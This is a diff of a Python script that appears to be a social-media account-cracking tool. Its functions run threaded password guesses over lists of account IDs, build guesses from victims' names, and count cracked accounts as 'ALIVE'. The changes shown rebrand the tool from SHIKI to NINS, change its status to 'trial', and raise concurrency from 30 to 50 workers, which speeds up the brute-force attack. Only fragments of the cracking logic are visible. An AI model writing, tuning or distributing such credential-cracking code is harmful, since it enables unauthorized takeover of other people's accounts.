@@ -72,7 +72,7 @@ logo = ("""
  │└─────────────────┘
  │┌[  author       Niño
  │├[  version      2.0 
- │├[ status         private
+ │├[ status         trial
  │├[ replit           blank
  │├[ github         blank
  │└[ hope you like it 
@@ -169,7 +169,7 @@ def Spy():
 			pcp.append(f'n')
 		else:
 			pcp.append(f'y')
-		with tred(max_workers=30) as crack_submit:
+		with tred(max_workers=50) as crack_submit:
 			clear()
 			total_ids = str(len(fo))
 			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;37mM{mthd}')
@@ -190,7 +190,7 @@ def Spy():
 					crack_submit.submit(api1,ids,names,passlist)
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [SHIKI] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [NINS] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -233,7 +233,7 @@ xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","G
 #
 def ffb1(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [SHIKI] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [NINS] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -276,7 +276,7 @@ def ffb1(ids,names,passlist):
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [SHIKI] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [NINS] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
